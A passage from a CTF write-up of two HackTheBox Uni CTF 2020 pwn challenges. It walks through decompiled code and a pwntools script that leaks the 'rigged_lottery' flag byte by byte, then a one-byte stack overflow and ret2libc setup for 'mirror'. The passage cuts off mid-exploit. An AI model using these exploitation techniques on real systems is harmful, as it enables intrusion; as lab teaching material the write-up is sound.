  </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(iVar1 </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">) {
    local_14 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">open</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;/dev/urandom&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
    </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(local_14 </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">) {
      </span><span style="color:#f28779;">fwrite</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Error opening /dev/urandom, exiting..</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x27</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">stderr)</span><span style="color:#ccc9c2cc;">;
                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
      </span><span style="color:#f28779;">exit</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x22</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
    </span><span style="color:#ccc9c2;">}
    </span><span style="color:#ffd580;">read</span><span style="color:#ccc9c2;">(local_14</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">rigged_number</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x31</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
    </span><span style="color:#ffd580;">close</span><span style="color:#ccc9c2;">(local_14)</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">    iVar1 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">strcmp</span><span style="color:#ccc9c2;">(lucky_number</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">rigged_number)</span><span style="color:#ccc9c2cc;">;
    </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(iVar1 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">) {
      </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">You won! Claim your reward!&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">      prize_flag </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
    </span><span style="color:#ccc9c2;">}
    </span><span style="color:#ffa759;">else </span><span style="color:#ccc9c2;">{
      </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">You lost! Try again!&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
    </span><span style="color:#ccc9c2;">}
  }
  </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(local_10 </span><span style="color:#f29e74;">!= *</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span style="color:#ccc9c2;">)) {
                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
    </span><span style="color:#ffd580;">__stack_chk_fail</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ccc9c2;">}
  </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">}
</span></code></pre>
<p>We win if our lucky number is the same as the random numbers it generates.  It's using /dev/urandom so that doesn't seem very easy to attack.  The only thing I can think of would be getting a null byte into the first byte of <code>lucky_number</code> and then trying repeatedly until <code>/dev/urandom</code> gives us a null byte in the first byte of <code>rigged_number</code>.  It also doesn't do any bounds checking on the number of coins we bet which means we can bet a negative number of coins and get an arbitrary number of coins that way.</p>
<h3 id="claim">claim</h3>
<pre style="background-color:#212733;">
<code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">claim</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">void</span><span style="color:#ccc9c2;">)

{
  </span><span style="color:#ffa759;">int</span><span style="color:#ccc9c2;"> __fd</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">long</span><span style="color:#ccc9c2;"> in_FS_OFFSET</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">int</span><span style="color:#ccc9c2;"> local_40</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  byte local_38 [</span><span style="color:#ffcc66;">40</span><span style="color:#ccc9c2;">]</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">long</span><span style="color:#ccc9c2;"> local_10</span><span style="color:#ccc9c2cc;">;
  
</span><span style="color:#ccc9c2;">  local_10 </span><span style="color:#f29e74;">= *</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">((prize_flag </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">) </span><span style="color:#f29e74;">&amp;&amp; </span><span style="color:#ccc9c2;">(cosy_coins </span><span style="color:#f29e74;">&lt;= </span><span style="color:#ffcc66;">100</span><span style="color:#ccc9c2cc;">.</span><span style="color:#ffcc66;">00000000</span><span style="color:#ccc9c2;">)) {
    </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">No prizes available!&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
    </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(local_10 </span><span style="color:#f29e74;">!= *</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span style="color:#ccc9c2;">)) {
                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
      </span><span style="color:#ffd580;">__stack_chk_fail</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
    </span><span style="color:#ccc9c2;">}
    </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ccc9c2;">}
  </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Enjoy your prize!!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  cosy_coins </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> cosy_coins </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">269</span><span style="color:#ccc9c2cc;">.</span><span style="color:#ffcc66;">00000000</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  local_40 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  __fd </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">open</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;./flag.txt&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(__fd </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">) {
    </span><span style="color:#f28779;">fwrite</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Error opening flag, exiting..</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x1f</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">stderr)</span><span style="color:#ccc9c2cc;">;
                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
    </span><span style="color:#f28779;">exit</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x6969</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ccc9c2;">}
  </span><span style="color:#ffd580;">read</span><span style="color:#ccc9c2;">(__fd</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">local_38</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x21</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">while </span><span style="color:#ccc9c2;">(local_40 </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0x21</span><span style="color:#ccc9c2;">) {
    local_38[local_40] </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> local_38[local_40] </span><span style="color:#f29e74;">^</span><span style="color:#ccc9c2;"> lucky_number[local_40]</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">    local_40 </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> local_40 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ccc9c2;">}
  </span><span style="color:#ffd580;">close</span><span style="color:#ccc9c2;">(__fd)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#f28779;">printf</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">local_38)</span><span style="color:#ccc9c2cc;">;
                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
  </span><span style="color:#f28779;">exit</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0xa9</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">}
</span></code></pre>
<p>So, we get the flag if <code>prize_flag</code> is true or if we have more than 100 coins.  It's pretty trivial to get more than 100 coins which makes it quite unfortunate that what we actually get is the flag bitwise XORed with our lucky number.</p>
<h2 id="putting-it-all-together">putting it all together</h2>
<p>So, we can print out the flag XORed with our lucky number but where do we go from there?  It's populated with random bytes at startup and attacking <code>/dev/urandom</code> would be tough at best.  If you'll recall, the generate function uses <code>strcpy</code> to copy the randomly generated bytes into <code>lucky_number</code> which will always copy a null terminator also.  This means that if generate n random bytes then there will be a null byte in <code>lucky_number[n]</code> which means we can leak a single byte of the flag.  We can then just do this multiple times to leak every character and then attach them together.</p>
<pre style="background-color:#212733;">
<code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3

</span><span style="color:#ffa759;">from </span><span style="color:#ccc9c2;">pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*

</span><span style="color:#ccc9c2;">exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;rigged_lottery&quot;</span><span style="color:#ccc9c2;">)

context</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">binary </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">exe


</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span style="color:#ccc9c2;">():
    </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">args</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">LOCAL:
        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">process</span><span style="color:#ccc9c2;">([exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">path])
    </span><span style="color:#ffa759;">else</span><span style="color:#ccc9c2;">:
        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">remote</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;docker.hackthebox.eu&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">30269</span><span style="color:#ccc9c2;">)


</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span style="color:#ccc9c2;">():

    buf </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;&quot;
    </span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span style="color:#ccc9c2;">(</span><span style="color:#f28779;">len</span><span style="color:#ccc9c2;">(buf)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">32</span><span style="color:#ccc9c2;">):
        r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span style="color:#ccc9c2;">()
        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;4. Exit.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;2&quot;</span><span style="color:#ccc9c2;">)
        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;-300&quot;</span><span style="color:#ccc9c2;">)
        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;4. Exit.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;1&quot;</span><span style="color:#ccc9c2;">)
        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="font-style:italic;color:#5ccfe6;">str</span><span style="color:#ccc9c2;">(i))
        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;4. Exit.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;3&quot;</span><span style="color:#ccc9c2;">)
        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;prize!!</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
        res </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvall</span><span style="color:#ccc9c2;">()
        buf </span><span style="color:#f29e74;">+= </span><span style="color:#f28779;">chr</span><span style="color:#ccc9c2;">(res[i])
        </span><span style="color:#f28779;">print</span><span style="color:#ccc9c2;">(buf)

</span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span style="color:#ccc9c2;">:
    </span><span style="color:#ffd580;">main</span><span style="color:#ccc9c2;">()
</span></code></pre><pre style="background-color:#212733;">
<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">❯ python rigged_lottery.py SILENT=1
HTB{strcpy_0nly_c4us3s_tr0ubl3!}
</span></code></pre><h1 id="mirror">mirror</h1>
<pre style="background-color:#212733;">
<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">You found an ol&#39; dirty mirror inside an abandoned house. This magic mirror reflects your most hidden desires! Use it to reveal the things you want the most in life! Don&#39;t say too much though..
</span></code></pre><h2 id="initial-review-2">initial review</h2>
<pre style="background-color:#212733;">
<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">❯ checksec mirror
[*] &#39;/home/sky/Dropbox/ctf/hackthebox-uni-ctf-2020/pwn/mirror&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
</span></code></pre><pre style="background-color:#212733;">
<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">❯ ./mirror
✨ This old mirror seems to contain some hidden power..✨
There is a writing at the bottom of it..
&quot;The mirror will reveal whatever you desire the most.. Just talk to it..&quot;
Do you want to talk to the mirror? (y/n)
&gt; y
Your answer was: y
&quot;This is a gift from the craftsman.. [0x7ffeb133f5b0] [0x7f9a77796b10]&quot;
Now you can talk to the mirror.
&gt; hi
</span></code></pre>
<p>No canary and we get a couple addresses to help bypass PIE.  Let's take a look at what those addresses are and see if we can find where our stack overflow is.</p>
<h3 id="main-1">main</h3>
<pre style="background-color:#212733;">
<code class="language-c" data-lang="c"><span style="color:#ccc9c2;">undefined8 </span><span style="color:#ffd580;">main</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">void</span><span style="color:#ccc9c2;">)

{
  undefined8 local_28</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  undefined8 local_20</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  undefined8 local_18</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  undefined8 local_10</span><span style="color:#ccc9c2cc;">;
  
  </span><span style="color:#ffd580;">setup</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  local_28 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  local_20 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  local_18 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  local_10 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(
      </span><span style="color:#bae67e;">&quot;✨ This old mirror seems to contain some hidden power..✨</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">There is a writing at the bottom ofit..&quot;
      </span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\&quot;</span><span style="color:#bae67e;">The mirror will reveal whatever you desire the most.. Just talk to it..</span><span style="color:#95e6cb;">\&quot;</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#f28779;">printf</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;Do you want to talk to the mirror? (y/n)</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&gt; &quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffd580;">read</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span style="color:#ccc9c2;">local_28</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x1f</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(((</span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2;">)local_28 </span><span style="color:#f29e74;">!= </span><span style="color:#bae67e;">&#39;y&#39;</span><span style="color:#ccc9c2;">) </span><span style="color:#f29e74;">&amp;&amp; </span><span style="color:#ccc9c2;">((</span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2;">)local_28 </span><span style="color:#f29e74;">!= </span><span style="color:#bae67e;">&#39;Y&#39;</span><span style="color:#ccc9c2;">)) {
    </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;You left the abandoned house safe!&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
    </span><span style="color:#f28779;">exit</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x45</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ccc9c2;">}
  </span><span style="color:#f28779;">printf</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;Your answer was: &quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#f28779;">printf</span><span style="color:#ccc9c2;">((</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)</span><span style="color:#f29e74;">&amp;</span><span style="color:#ccc9c2;">local_28)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffd580;">reveal</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">}
</span></code></pre><h3 id="reveal">reveal</h3>
<pre style="background-color:#212733;">
<code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">reveal</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">void</span><span style="color:#ccc9c2;">)

{
  undefined local_28 [</span><span style="color:#ffcc66;">32</span><span style="color:#ccc9c2;">]</span><span style="color:#ccc9c2cc;">;
  
  </span><span style="color:#f28779;">printf</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\&quot;</span><span style="color:#bae67e;">This is a gift from the craftsman.. [</span><span style="color:#ffcc66;">%p</span><span style="color:#bae67e;">] [</span><span style="color:#ffcc66;">%p</span><span style="color:#bae67e;">]</span><span style="color:#95e6cb;">\&quot;\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">local_28</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">printf)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#f28779;">printf</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;Now you can talk to the mirror.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&gt; &quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
                    </span><span style="font-style:italic;color:#5c6773;">/* Overruns using local_28(+0,1,40) */
  </span><span style="color:#ffd580;">read</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">local_28</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x21</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">}
</span></code></pre>
<p>So, we have a one byte overrun from local_28 which means we can control the lower byte of the stored stack base pointer.  The addresses it gives us are a variable on the stack and the location of printf.</p>
<h2 id="leaking-libc">leaking libc</h2>
<pre style="background-color:#212733;">
<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">❯ nc docker.hackthebox.eu 30272
✨ This old mirror seems to contain some hidden power..✨
There is a writing at the bottom of it..
&quot;The mirror will reveal whatever you desire the most.. Just talk to it..&quot;
Do you want to talk to the mirror? (y/n)
&gt; y
Your answer was: y
&quot;This is a gift from the craftsman.. [0x7ffda86edb00] [0x7f572b026f70]&quot;
Now you can talk to the mirror.
&gt; ^C
</span></code></pre>
<p>I will be using the lovely <a href="https://github.com/niklasb/libc-database">libc-database</a> to figure out the libc version from the printf address it prints.  ASLR means the upper bits are useless but the lower 12 are fixed and so can be used to determine the libc version.</p>
<pre style="background-color:#212733;">
<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">❯ ./find printf f70
ubuntu-old-glibc (libc6_2.24-9ubuntu2.2_i386)
ubuntu-old-glibc (libc6_2.24-9ubuntu2_i386)
ubuntu-glibc (libc6_2.27-3ubuntu1.3_amd64)
debian-glibc (libc6_2.31-4_i386)
</span></code></pre>
<p>We have four candidates, only one of which is amd64 so it's pretty easy to pick from them.  The server is likely running libc 2.27.</p>
<h2 id="putting-it-all-together-1">putting it all together</h2>
<p>We only have a single byte overrun so we can't overwrite the return pointer directly but as it turns out we don't need to because the main function returns after <code>reveal</code> finishes.  The &quot;true&quot; stored stack base pointer and the address of the buffer we're writing to only differ by a single byte so we can overwrite that byte and when <code>reveal</code> returns it will adjust the stack frame such that when main returns it looks to the beginning of our buffer for the return pointer.  We also know the libc version and the address of a symbol within libc so we can perform a <a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">ret2libc</a> attack and call <code>system(&quot;/bin/sh&quot;)</code></p>
<pre style="background-color:#212733;">
<code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3

</span><span style="color:#ffa759;">from </span><span style="color:#ccc9c2;">pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
</span><span style="color:#ffa759;">import </span><span style="color:#ccc9c2;">re
exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;mirror&quot;</span><span style="color:#ccc9c2;">)

context</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">binary </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">exe
context</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">terminal </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">[</span><span style="color:#bae67e;">&quot;termite&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;-e&quot;</span><span style="color:#ccc9c2;">]

</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span style="color:#ccc9c2;">():
    </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">args</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">LOCAL:
        libc </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;/home/sky/libc-database/db/libc-2.32-5-x86_64.so&quot;</span><span style="color:#ccc9c2;">)
        </span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">(libc</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffd580;">process</span><span style="color:#ccc9c2;">([exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">path]))
    </span><span style="color:#ffa759;">else</span><span style="color:#ccc9c2;">:
        libc </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;/home/sky/libc-database/db/libc6_2.27-3ubuntu1.3_amd64.so&quot;</span><span style="color:#ccc9c2;">)
        </span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">(libc</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffd580;">remote</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;docker.hackthebox.eu&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">30272</span><span style="color:#ccc9c2;">))


</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">send_padded</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">msg</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">l</span><span style="color:#ccc9c2;">):
    </span><span style="color:#ffa759;">assert </span><span style="color:#f28779;">len</span><span style="color:#ccc9c2;">(msg) </span><span style="color:#f29e74;">&lt;= </span><span style="color:#ccc9c2;">l
    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span style="color:#ccc9c2;">(msg </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ccc9c2;">(l </span><span style="color:#f29e74;">- </span><span style="color:#f28779;">len</span><span style="color:#ccc9c2;">(msg)))

